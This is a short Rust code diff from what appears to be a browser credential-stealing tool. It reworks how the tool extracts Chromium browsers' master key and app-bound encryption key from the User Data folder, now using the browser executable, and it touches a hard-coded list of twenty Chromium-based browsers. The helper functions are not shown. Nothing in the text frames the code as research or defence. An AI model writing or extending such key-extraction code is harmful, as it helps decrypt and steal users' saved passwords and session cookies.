@@ -64,8 +64,9 @@ fn get_browser(browser: &ChromiumBasedBrowser) -> Option<BrowserData> {
         return None;
     }
 
-    let master_key = unsafe { extract_master_key(&browser.user_data) };
-    let app_bound_encryption_key = unsafe { extract_app_bound_encrypted_key(&browser.user_data) };
+    let master_key = extract_master_key(&browser.user_data);
+    let app_bound_encryption_key = browser.executable.as_ref()
+        .and_then(|executable| extract_app_bound_encrypted_key(executable, &browser.user_data));
     
     if !browser.has_profiles {
         return Some(BrowserData {
@@ -198,6 +199,7 @@ fn get_chromium_browsers() -> [ChromiumBasedBrowser; 20] {
     let program_files_x86 = Path::program_files_x86();
     let user_data = s!("User Data").to_owned();
 
+    // TODO: More executables
     [
         browser!(
             name: "Amingo",
